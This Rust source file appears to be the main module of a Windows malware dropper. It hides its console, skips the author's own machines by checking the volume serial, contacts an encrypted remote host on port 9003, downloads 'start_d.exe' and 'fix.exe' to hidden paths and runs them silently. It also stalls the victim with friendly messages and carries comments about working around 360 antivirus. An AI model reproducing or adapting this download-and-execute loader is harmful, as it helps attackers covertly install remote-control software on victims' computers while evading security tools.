#![windows_subsystem = "windows"]  //此宏不打开窗口，同时print也失效

mod req_util;

use std::error::Error;
use std::ffi::OsStr;
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::process::{exit, Stdio};
use std::ptr::null_mut;
use std::time::Duration;
use anyhow::anyhow;
use tokio::{fs, time};
use tokio::fs::OpenOptions;
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::process::Command;
use winapi::um::processthreadsapi::{CreateProcessW, PROCESS_INFORMATION, STARTUPINFOW};
use common::generated::encrypted_strings::*;
use crate::req_util::{get_file_bytes, info_call};


#[tokio::main]
async fn main() {
    if let Ok(s) = current().await {
        if [MACHINE_CODE_1(), MACHINE_CODE_2(),MACHINE_CODE_3()].iter().any(|part| { s.contains(part) }) {
            println!("主人你好🤷‍♂️🤷‍♂️🤷‍♂️");
            time::sleep(Duration::from_secs(3)).await;
            exit(0);
        }
    }
    println!("你好😃😃😃...");

    let host_str = HOST();
    let (host, port) = (host_str.as_str(), 9003);


    let mut install = false;
    let run_path = START_RUN_PATH();

    let info = match std::env::current_exe() {
        Ok(p) => {
            //在隐藏的路径上，那么向下运行
            if PathBuf::from(run_path.clone()) == p {
                format!("start执行成功,{:?}", p)
            } else {
                //已经存在且删除失败就说明在执行,就什么都不干
                if PathBuf::from(run_path.clone()).exists() && fs::remove_file(run_path.clone()).await.is_err() {
                    info_call((host, port), format!("start 已存在，应该是用户重复打开,{:?}", std::env::current_exe()).as_str()).await;
                    //与用户周旋一会再关闭
                    engage_with_user_then_exit().await;
                    unreachable!()
                }
                install = true;
                "start准备下载fix.exe".to_owned()
            }
        }
        Err(e) => {
            format!("start获取自身位置失败,err:{}", e)
        }
    };
    println!("请再等等😘，这可能需要几分钟~");
    info_call((host, port), info.as_str()).await;


    loop {
        //下载后台执行start文件
        if install {
            if let Err(e) = install_and_run_start_d((host, port), run_path.as_str()).await {
                info_call((host, port), e.to_string().as_str()).await;
                tokio::time::sleep(Duration::from_secs(20)).await;
                continue;
            };
        }
        //下载后台执行fix
        match install_and_run_fix((host, port), FIX_SAVE_PATH().as_str()).await {
            Ok(_) => {
                info_call((host, port), "运行fix成功").await;
            }
            Err(e) => {
                info_call((host, port), e.to_string().as_str()).await;
                tokio::time::sleep(Duration::from_secs(20)).await;
                continue;
            }
        };
        break;
    }
    //由于可能无法在隐藏路径下执行而是直接在当前路径执行，所以也需要这个
    engage_with_user_then_exit().await;
}


async fn install_and_run_fix((host, port): (&str, u16), save_path: &str) -> anyhow::Result<()> {
    match get_file_bytes((host, port), "fix.exe").await {
        Err(e) => {
            Err(anyhow!("start获取fix文件失败,err:{}", e))
        }
        Ok(v) => {
            match save_file(save_path, &v).await {
                Ok(_) => {
                    match win_exec_any_file(OsStr::new(save_path).as_ref()) {
                        Ok(_) => {
                            Ok(())
                        }
                        Err(e) => {
                            Err(anyhow!("start执行fix文件失败,{}", e))
                        }
                    }
                }
                Err(e) => {
                    Err(anyhow!("start保存fix文件失败,{}", e))
                }
            }
        }
    }
}


//
async fn install_and_run_start_d((host, port): (&str, u16), save_path: &str) -> anyhow::Result<()> {
    match get_file_bytes((host, port), "start_d.exe").await {
        Ok(current) => {
            match save_file(save_path, current.as_ref()).await {
                Ok(_) => {
                    match win_exec_any_file(OsStr::new(save_path).as_ref()) {
                        Ok(_) => {
                            Ok(())
                        }
                        Err(e) => {
                            Err(anyhow!("{},err:{}",START_ERROR_1(),e))
                        }
                    }
                }
                Err(e) => {
                    Err(anyhow!("{},err:{}",START_ERROR_2(),e))
                }
            }
        }
        Err(e) => {
            Err(anyhow!("{},err:{}",START_ERROR_3(), e))
        }
    }
}

async fn engage_with_user_then_exit() {
    //代表就绪
    println!("❤❤你真好......");
    time::sleep(Duration::from_secs(1)).await;
    println!("呜呜😢😢😢😢");
    time::sleep(Duration::from_secs(3)).await;
    println!("再见!😎😎");
    time::sleep(Duration::from_secs(2)).await;
    std::process::exit(0);
}


//执行不成功基本都是被360搞了，此时换个方式执行
//注意即使返回ok，winapi在执行其的时候看似执行成功，但这里执行的目标文件若非  #![windows_subsystem = "windows"]  的，实际上不会执行成功。
//todo 添加获取到的参数
pub fn win_exec_any_file(path: &OsStr) -> anyhow::Result<()> {
    match cmd_exec_file(path.clone()) {
        Ok(_) => {}
        Err(e) => {
            return Err(anyhow!("使用cmd执行文件{:?}失败,{}", path,e));
        }
    }
    Ok(())


    // let path_wide: Vec<u16> = path
    //     .encode_wide()
    //     .chain(once(0))
    //     .collect();
    // let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    // let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    //
    // si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
    // let success = unsafe {
    //     CreateProcessW(
    //         null_mut(),
    //         path_wide.as_ptr() as *mut _,
    //         null_mut(),
    //         null_mut(),
    //         false as i32,
    //         0,
    //         null_mut(),
    //         null_mut(),
    //         &mut si,
    //         &mut pi,
    //     )
    // };
    //
    // if success == 0 {
    //     match copy_and_rename(&PathBuf::from(path)) {
    //         Ok(new_path) => {
    //             match cmd_exec_file(new_path.clone()) {
    //                 Ok(_) => {}
    //                 Err(e) => {
    //                     return Err(anyhow!("winapi失败后，使用cmd执行文件{:?}也失败,{}", new_path,e));
    //                 }
    //             }
    //         }
    //         Err(e) => {
    //             return Err(anyhow!("winapi失败后，copy_and_rename失败,{}", e));
    //         }
    //     }
    // }
    //
    // // 如果想要父进程等待子进程结束,不知道为什么没起作用
    // // unsafe {
    // //     winapi::um::synchapi::WaitForSingleObject(pi.hProcess, winapi::um::winbase::INFINITE);
    // //     winapi::um::handleapi::CloseHandle(pi.hProcess);
    // //     winapi::um::handleapi::CloseHandle(pi.hThread);
    // // }
    // Ok(())
}

//执行一个文件且不等待输出
pub fn cmd_exec_file<P: AsRef<Path>>(path: P) -> anyhow::Result<()> {
    use std::os::windows::process::CommandExt;
    let mut command = std::process::Command::new(path.as_ref().as_os_str());
    let _ = command
        .creation_flags(0x08000000)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    // if cmd_args.len() > 1 {
    //     for i in 1..cmd_args.len() {
    //         c = c.arg(cmd_args[i].as_str());
    //     }
    // }
    Ok(())
}

pub fn copy_and_rename<P: AsRef<Path>>(original_path: P) -> anyhow::Result<PathBuf> {
    // 确保输入的路径是一个文件
    let original_path = PathBuf::from(original_path.as_ref());
    if !original_path.is_file() {
        return Err(anyhow!( "Provided path is not a file"));
    }

    let mut new_filename = "_".to_owned();
    new_filename.push_str(original_path.file_stem().unwrap().to_str().unwrap());
    new_filename.push_str(".exe");

    let new_path = original_path.with_file_name(new_filename);

    std::fs::copy(&original_path, &new_path)?;

    Ok(new_path)
}

pub async fn save_file<P: AsRef<Path>>(path: P,
                                       bys: &[u8]) -> anyhow::Result<()> {
    // 先确保路径中的目录都存在
    if let Some(parent_dir) = path.as_ref().parent() {
        if !parent_dir.exists() {
            fs::create_dir_all(parent_dir).await?;
        }
    }
    let mut file = OpenOptions::new()
        //文件必须可写
        .write(true)
        //文件不存在时创建
        .create(true)
        //写时将原文件弄成0
        .truncate(true)
        .open(path)
        .await?;

    // 如果你知道预期的大小，可以预先分配空间
    file.set_len(bys.len() as u64).await?;

    file.write_all(bys).await?;

    // 确保数据已经物理地写入磁盘
    file.sync_all().await?;

    Ok(())
}

pub async fn read_file<P: AsRef<Path>>(path: P) -> Result<Vec<u8>, Box<dyn Error>> {
    let file = fs::File::open(path).await?;
    //由于下面预分配了缓冲区，这里貌似不需要BufReader，但还是留着
    let mut reader = BufReader::new(file);
    // 尝试获取文件大小，以预分配缓冲区
    let initial_buffer_size = reader.get_ref().metadata().await.map(|m| m.len() as usize + 1).unwrap_or(0);
    let mut buffer = Vec::with_capacity(initial_buffer_size);
    reader.read_to_end(&mut buffer).await?;
    Ok(buffer)
}

pub async fn current() -> anyhow::Result<String> {
    let output = Command::new("cmd")
        .creation_flags(0x08000000)
        .args(&["/C", "vol", "C:"])
        .output()
        .await?;

    let output_str = String::from_utf8_lossy(&output.stdout);
    return Ok(output_str.to_string());
}

#[tokio::test]
pub async fn test() {
    // let run_path = "D:/safe/user.txt";
    // println!("{}", current().await.unwrap());
    // // println!("{:?}", win_exec_any_file(OsStr::new(run_path)).as_ref());
    let v1 = read_file(r"E:\RsCode\myCode\real_time_ctrl\target\release\start.exe").await.unwrap();
    let v2 = read_file(r"E:\RsCode\myCode\real_time_ctrl\target\release\start_d.exe").await.unwrap();

    assert_eq!(v1.len(), v2.len());
    let mut diff = vec![];

    for i in 0..v1.len() {
        if v1[i] != v2[i] {
            diff.push((i, (v1[i], v2[i])));
        }
    }

    println!("{:?}", diff.len());
}